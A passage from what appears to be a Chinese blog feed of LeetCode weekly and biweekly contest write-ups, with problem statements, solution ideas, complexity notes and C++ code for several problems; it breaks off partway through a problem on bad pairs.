<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcdd&quot;</span><br><span class="line">输出：&quot;d&quot;</span><br><span class="line">解释：</span><br><span class="line">只有字母 &#x27;d&#x27; 出现两次，所以返回 &#x27;d&#x27; 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= s.length &lt;= 100</code></li>
<li><code>s</code> 由小写英文字母组成</li>
<li><code>s</code> 包含至少一个重复字母</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-83/problems/best-poker-hand/">https://leetcode.cn/contest/biweekly-contest-83/problems/best-poker-hand/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单题目，直接尝试所有的可能即可</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(\Sigma)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">char</span> <span class="title">repeatedCharacter</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            cnt[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">            <span class="keyword">if</span> (cnt[s[i] - <span class="string">&#x27;a&#x27;</span>]&gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> s[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6125-相等行列对"><a href="#6125-相等行列对" class="headerlink" title="6125. 相等行列对"></a>6125. 相等行列对</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始、大小为 <code>n x n</code> 的整数矩阵 <code>grid</code> ，返回满足 <code>Ri</code> 行和 <code>Cj</code> 列相等的行列对 <code>(Ri, Cj)</code> 的数目。</p>
<p>如果行和列以相同的顺序包含相同的元素（即相等的数组），则认为二者是相等的。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[3,2,1],[1,7,6],[2,7,7]]</span><br><span class="line">输出：1</span><br><span class="line">解释：存在一对相等行列对：</span><br><span class="line">- (第 2 行，第 1 列)：[2,7,7]</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[3,1,2,2],[1,4,4,5],[2,4,2,2],[2,4,2,2]]</span><br><span class="line">输出：3</span><br><span class="line">解释：存在三对相等行列对：</span><br><span class="line">- (第 0 行，第 0 列)：[3,1,2,2]</span><br><span class="line">- (第 2 行, 第 2 列)：[2,4,2,2]</span><br><span class="line">- (第 3 行, 第 2 列)：[2,4,2,2]</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == grid.length == grid[i].length</code></li>
<li><code>1 &lt;= n &lt;= 200</code></li>
<li><code>1 &lt;= grid[i][j] &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-303/problems/equal-row-and-column-pairs/">https://leetcode.cn/contest/weekly-contest-303/problems/equal-row-and-column-pairs/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目可以算是简单题目，直接遍历矩阵的每个元素 $(x,y)$，然后比较第 $x$ 行的元素与第 $j$ 列的元素是否相等。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n^3)$，$n$ 表示矩阵的行数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">equalPairs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="comment">/* row i, col j */</span></span><br><span class="line">                <span class="type">bool</span> isValid = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (grid[i][k] != grid[k][j]) &#123;</span><br><span class="line">                        isValid = <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (isValid) &#123;</span><br><span class="line">                    ans++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6126-设计食物评分系统"><a href="#6126-设计食物评分系统" class="headerlink" title="6126. 设计食物评分系统"></a>6126. 设计食物评分系统</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>设计一个支持下述操作的食物评分系统：</p>
<p>修改 系统中列出的某种食物的评分。<br>返回系统中某一类烹饪方式下评分最高的食物。<br>实现 <code>FoodRatings</code> 类：</p>
<ul>
<li><code>FoodRatings(String[] foods, String[] cuisines, int[] ratings)</code> 初始化系统。食物由 <code>foods、cuisines</code> 和。</li>
<li><code>ratings</code> 描述，长度均为 <code>n</code> 。</li>
<li><code>foods[i]</code> 是第 <code>i</code> 种食物的名字。</li>
<li><code>cuisines[i]</code> 是第 <code>i</code> 种食物的烹饪方式。</li>
<li><code>ratings[i]</code> 是第 <code>i</code> 种食物的最初评分。</li>
<li><code>void changeRating(String food, int newRating)</code> 修改名字为 <code>food</code> 的食物的评分。</li>
<li><code>String highestRated(String cuisine)</code> 返回指定烹饪方式 <code>cuisine</code> 下评分最高的食物的名字。如果存在并列，返回 字典序较小 的名字。<br>注意，字符串 <code>x</code> 的字典序比字符串 <code>y</code> 更小的前提是：<code>x</code> 在字典中出现的位置在 <code>y</code> 之前，也就是说，要么 <code>x </code>是 <code>y</code> 的前缀，或者在满足 <code>x[i] != y[i]</code> 的第一个位置 <code>i</code> 处，<code>x[i]</code> 在字母表中出现的位置在 <code>y[i]</code> 之前。</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">[&quot;FoodRatings&quot;, &quot;highestRated&quot;, &quot;highestRated&quot;, &quot;changeRating&quot;, &quot;highestRated&quot;, &quot;changeRating&quot;, &quot;highestRated&quot;]</span><br><span class="line">[[[&quot;kimchi&quot;, &quot;miso&quot;, &quot;sushi&quot;, &quot;moussaka&quot;, &quot;ramen&quot;, &quot;bulgogi&quot;], [&quot;korean&quot;, &quot;japanese&quot;, &quot;japanese&quot;, &quot;greek&quot;, &quot;japanese&quot;, &quot;korean&quot;], [9, 12, 8, 15, 14, 7]], [&quot;korean&quot;], [&quot;japanese&quot;], [&quot;sushi&quot;, 16], [&quot;japanese&quot;], [&quot;ramen&quot;, 16], [&quot;japanese&quot;]]</span><br><span class="line">输出</span><br><span class="line">[null, &quot;kimchi&quot;, &quot;ramen&quot;, null, &quot;sushi&quot;, null, &quot;ramen&quot;]</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line">FoodRatings foodRatings = new FoodRatings([&quot;kimchi&quot;, &quot;miso&quot;, &quot;sushi&quot;, &quot;moussaka&quot;, &quot;ramen&quot;, &quot;bulgogi&quot;], [&quot;korean&quot;, &quot;japanese&quot;, &quot;japanese&quot;, &quot;greek&quot;, &quot;japanese&quot;, &quot;korean&quot;], [9, 12, 8, 15, 14, 7]);</span><br><span class="line">foodRatings.highestRated(&quot;korean&quot;); // 返回 &quot;kimchi&quot;</span><br><span class="line">                                    // &quot;kimchi&quot; 是分数最高的韩式料理，评分为 9 。</span><br><span class="line">foodRatings.highestRated(&quot;japanese&quot;); // 返回 &quot;ramen&quot;</span><br><span class="line">                                      // &quot;ramen&quot; 是分数最高的日式料理，评分为 14 。</span><br><span class="line">foodRatings.changeRating(&quot;sushi&quot;, 16); // &quot;sushi&quot; 现在评分变更为 16 。</span><br><span class="line">foodRatings.highestRated(&quot;japanese&quot;); // 返回 &quot;sushi&quot;</span><br><span class="line">                                      // &quot;sushi&quot; 是分数最高的日式料理，评分为 16 。</span><br><span class="line">foodRatings.changeRating(&quot;ramen&quot;, 16); // &quot;ramen&quot; 现在评分变更为 16 。</span><br><span class="line">foodRatings.highestRated(&quot;japanese&quot;); // 返回 &quot;ramen&quot;</span><br><span class="line">                                      // &quot;sushi&quot; 和 &quot;ramen&quot; 的评分都是 16 。</span><br><span class="line">                                      // 但是，&quot;ramen&quot; 的字典序比 &quot;sushi&quot; 更小。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 2 * 104</code></li>
<li><code>n == foods.length == cuisines.length == ratings.length</code></li>
<li><code>1 &lt;= foods[i].length, cuisines[i].length &lt;= 10</code></li>
<li><code>foods[i]、cuisines[i]</code> 由小写英文字母组成</li>
<li><code>1 &lt;= ratings[i] &lt;= 108</code></li>
<li><code>foods</code> 中的所有字符串 互不相同</li>
<li>在对 <code>changeRating</code> 的所有调用中，<code>food</code> 是系统中食物的名字。</li>
<li>在对 <code>highestRated</code> 的所有调用中，<code>cuisine</code>是系统中 至少一种 食物的烹饪方式。</li>
<li>最多调用 <code>changeRating</code> 和 <code>highestRated</code> 总计<code> 2 * 104</code> 次</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-83/problems/design-a-number-container-system/">https://leetcode.cn/contest/biweekly-contest-83/problems/design-a-number-container-system/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>hash
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的 <code>hash</code>，设两个 <code>hash</code>。 <code>arr</code> 中存放着食物名称对应的烹饪方式和评分，<code>cnt</code> 存储着食物烹饪方式对应着的食物和评分的排名。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$。</li>
<li>空间复杂度：空间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cmp</span> &#123;  </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">const</span> pair&lt;<span class="type">int</span>,string&gt; &amp;s1, <span class="type">const</span> pair&lt;<span class="type">int</span>,string&gt; &amp;s2)</span> <span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s1.first == s2.first) &#123;</span><br><span class="line">            <span class="keyword">return</span> s1.second &gt; s2.second;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s1.first &lt; s2.first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FoodRatings</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FoodRatings</span>(vector&lt;string&gt;&amp; foods, vector&lt;string&gt;&amp; cuisines, vector&lt;<span class="type">int</span>&gt;&amp; ratings) &#123;</span><br><span class="line">        <span class="type">int</span> n = foods.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr[foods[i]] = <span class="built_in">make_pair</span>(ratings[i], cuisines[i]);</span><br><span class="line">            cnt[cuisines[i]].<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(ratings[i], foods[i]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">changeRating</span><span class="params">(string food, <span class="type">int</span> newRating)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> [rate, cuisine] = arr[food];</span><br><span class="line">        arr[food].first = newRating;</span><br><span class="line">        cnt[cuisine].<span class="built_in">erase</span>(<span class="built_in">make_pair</span>(rate, food));</span><br><span class="line">        cnt[cuisine].<span class="built_in">emplace</span>(newRating, food);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">string <span class="title">highestRated</span><span class="params">(string cuisine)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cnt[cuisine].<span class="built_in">rbegin</span>()-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;string, set&lt;pair&lt;<span class="type">int</span>, string&gt;, cmp&gt;&gt; cnt;</span><br><span class="line">    unordered_map&lt;string, pair&lt;<span class="type">int</span>, string&gt;&gt; arr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your FoodRatings object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * FoodRatings* obj = new FoodRatings(foods, cuisines, ratings);</span></span><br><span class="line"><span class="comment"> * obj-&gt;changeRating(food,newRating);</span></span><br><span class="line"><span class="comment"> * string param_2 = obj-&gt;highestRated(cuisine);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="6127-优质数对的数目"><a href="#6127-优质数对的数目" class="headerlink" title="6127. 优质数对的数目"></a>6127. 优质数对的数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的正整数数组 <code>nums</code> 和一个正整数 <code>k</code> 。</p>
<p>如果满足下述条件，则数对 <code>(num1, num2</code>) 是 优质数对 ：</p>
<ul>
<li><code>num1</code> 和 <code>num2</code> 都 在数组 <code>nums</code> 中存在。</li>
<li><code>num1 OR num2</code> 和 <code>num1 AND num2</code> 的二进制表示中值为 <code>1</code> 的位数之和大于等于 <code>k</code> ，其中 <code>OR</code> 是按位 或 操作，而 <code>AND</code> 是按位 与 操作。<br>返回 不同 优质数对的数目。</li>
</ul>
<p>如果 <code>a != c</code> 或者 <code>b != d</code> ，则认为 <code>(a, b)</code> 和 <code>(c, d)</code> 是不同的两个数对。例如，<code>(1, 2)</code> 和 <code>(2, 1)</code> 不同。</p>
<p>注意：如果 <code>num1</code> 在数组中至少出现 一次 ，则满足 <code>num1 == num2</code> 的数对 <code>(num1, num2)</code> 也可以是优质数对。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,1], k = 3</span><br><span class="line">输出：5</span><br><span class="line">解释：有如下几个优质数对：</span><br><span class="line">- (3, 3)：(3 AND 3) 和 (3 OR 3) 的二进制表示都等于 (11) 。值为 1 的位数和等于 2 + 2 = 4 ，大于等于 k = 3 。</span><br><span class="line">- (2, 3) 和 (3, 2)： (2 AND 3) 的二进制表示等于 (10) ，(2 OR 3) 的二进制表示等于 (11) 。值为 1 的位数和等于 1 + 2 = 3 。</span><br><span class="line">- (1, 3) 和 (3, 1)： (1 AND 3) 的二进制表示等于 (01) ，(1 OR 3) 的二进制表示等于 (11) 。值为 1 的位数和等于 1 + 2 = 3 。</span><br><span class="line">所以优质数对的数目是 5 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [5,1,1], k = 10</span><br><span class="line">输出：0</span><br><span class="line">解释：该数组中不存在优质数对。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
<li><code>1 &lt;= k &lt;= 60</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-303/problems/number-of-excellent-pairs/">https://leetcode.cn/contest/weekly-contest-303/problems/number-of-excellent-pairs/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们设 $bits(x)$ 表示 $x$ 的二进制位中含有 $1$ 的为数，此时我们数学推理可以知道 $bits(x|y) + bits(x \And y) &#x3D; bits(x) + bits(y)$，知道以上推理后，则这个题目就转换成了求数组中的两个数之和大于等于给定值的不同数对有多少个，题目就变的非常简单了。</li>
<li>首先我们为了去重，首先把数组中的重复元素全部去掉，因为重复的元素对应的数对相同，然后将其中的元素 $x$ 全部转化为 $bits(x)$，然后再转化的数组中找到满足两个元素之和大于等于 $k$ 的数对有多少个。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，$n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">countExcellentPairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : cnt) &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(__builtin_popcount(v));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> m = arr.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = m - (<span class="built_in">lower_bound</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), k - arr[i]) - arr.<span class="built_in">begin</span>());</span><br><span class="line">            ans += x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  biweekly conttest 84</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/22/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-conttest-84"><a href="#leetcode-biweekly-conttest-84" class="headerlink" title="leetcode  biweekly conttest 84"></a>leetcode  biweekly conttest 84</h2><p>最近越来越没有时间参加周赛了，只能赛后来写题解了。第二题稍微有点意思，其余的题目确实没有多少亮点。最近有亮点的题目确实越来越少了。</p>
<h3 id="6141-合并相似的物品"><a href="#6141-合并相似的物品" class="headerlink" title="6141. 合并相似的物品"></a>6141. 合并相似的物品</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你两个二维整数数组 <code>items1</code> 和 <code>items2</code> ，表示两个物品集合。每个数组 <code>items</code> 有以下特质：</p>
<ul>
<li><code>items[i] = [valuei, weighti]</code> 其中 <code>valuei</code> 表示第 <code>i</code> 件物品的 价值 ，<code>weighti</code> 表示第 <code>i</code> 件物品的 重量 。 </li>
<li><code>items</code> 中每件物品的价值都是 唯一的 。<br>请你返回一个二维数组 <code>ret</code>，其中 <code>ret[i] = [valuei, weighti]</code>， <code>weighti</code> 是所有价值为 <code>valuei</code> 物品的 重量之和 。</li>
</ul>
<p>注意：<code>ret</code> 应该按价值 升序 排序后返回。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：items1 = [[1,1],[4,5],[3,8]], items2 = [[3,1],[1,5]]</span><br><span class="line">输出：[[1,6],[3,9],[4,5]]</span><br><span class="line">解释：</span><br><span class="line">value = 1 的物品在 items1 中 weight = 1 ，在 items2 中 weight = 5 ，总重量为 1 + 5 = 6 。</span><br><span class="line">value = 3 的物品再 items1 中 weight = 8 ，在 items2 中 weight = 1 ，总重量为 8 + 1 = 9 。</span><br><span class="line">value = 4 的物品在 items1 中 weight = 5 ，总重量为 5 。</span><br><span class="line">所以，我们返回 [[1,6],[3,9],[4,5]] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：items1 = [[1,1],[3,2],[2,3]], items2 = [[2,1],[3,2],[1,3]]</span><br><span class="line">输出：[[1,4],[2,4],[3,4]]</span><br><span class="line">解释：</span><br><span class="line">value = 1 的物品在 items1 中 weight = 1 ，在 items2 中 weight = 3 ，总重量为 1 + 3 = 4 。</span><br><span class="line">value = 2 的物品在 items1 中 weight = 3 ，在 items2 中 weight = 1 ，总重量为 3 + 1 = 4 。</span><br><span class="line">value = 3 的物品在 items1 中 weight = 2 ，在 items2 中 weight = 2 ，总重量为 2 + 2 = 4 。</span><br><span class="line">所以，我们返回 [[1,4],[2,4],[3,4]] 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：items1 = [[1,3],[2,2]], items2 = [[7,1],[2,2],[1,4]]</span><br><span class="line">输出：[[1,7],[2,4],[7,1]]</span><br><span class="line">解释：</span><br><span class="line">value = 1 的物品在 items1 中 weight = 3 ，在 items2 中 weight = 4 ，总重量为 3 + 4 = 7 。</span><br><span class="line">value = 2 的物品在 items1 中 weight = 2 ，在 items2 中 weight = 2 ，总重量为 2 + 2 = 4 。</span><br><span class="line">value = 7 的物品在 items2 中 weight = 1 ，总重量为 1 。</span><br><span class="line">所以，我们返回 [[1,7],[2,4],[7,1]] 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= items1.length, items2.length &lt;= 1000</code></li>
<li><code>items1[i].length == items2[i].length == 2</code></li>
<li><code>1 &lt;= valuei, weighti &lt;= 1000</code></li>
<li><code>items1</code> 中每个 <code>valuei</code> 都是 唯一的 。</li>
<li><code>items2</code> 中每个 <code>valuei</code> 都是 唯一的 。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/merge-similar-items/">https://leetcode.cn/problems/merge-similar-items/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历 + 哈希表
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单题目，直接哈希表合并即可，或者直接遍历即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为数组的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">mergeSimilarItems</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; items1, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; items2) &#123;</span><br><span class="line">        map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : items1) &#123;</span><br><span class="line">            cnt[v[<span class="number">0</span>]] += v[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : items2) &#123;</span><br><span class="line">            cnt[v[<span class="number">0</span>]] += v[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [w, v] : cnt) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; item = &#123;w, v&#125;;</span><br><span class="line">            ans.<span class="built_in">emplace_back</span>(item);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6142-统计坏数对的数目"><a href="#6142-统计坏数对的数目" class="headerlink" title="6142. 统计坏数对的数目"></a>6142. 统计坏数对的数目</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的整数数组<code> nums</code> 。如果 <code>i &lt; j</code> 且 <code>j - i != nums[j] - nums[i]</code> ，那么我们称 <code>(i, j)</code> 是一个 坏数对 。</p>
<p>请你返回 <code>nums</code> 中 坏数对 的总数目。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,1,3,3]</span><br><span class="line">输出：5</span><br><span class="line">解释：数对 (0, 1) 是坏数对，因为 1 - 0 != 1 - 4 。</span><br><span class="line">数对 (0, 2) 是坏数对，因为 2 - 0 != 3 - 4, 2 != -1 。</span><br><span class="line">数对 (0, 3) 是坏数对，因为 3 - 0 != 3 - 4, 3 != -1 。</span><br><span class="line">数对 (1, 2) 是坏数对，因为 2 - 1 != 3 - 1, 1 != 2 。</span><br><span class="line">数对 (2, 3) 是坏数对，因为 3 - 2 != 3 - 3, 1 != 0 。</span><br><span class="line">总共有 5 个坏数对，所以我们返回 5 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,4,5]</span><br><span class="line">输出：0</span><br><span class="line">解释：没有坏数对。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/count-number-of-bad-pairs/">https://leetcode.cn/problems/count-number-of-bad-pairs/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
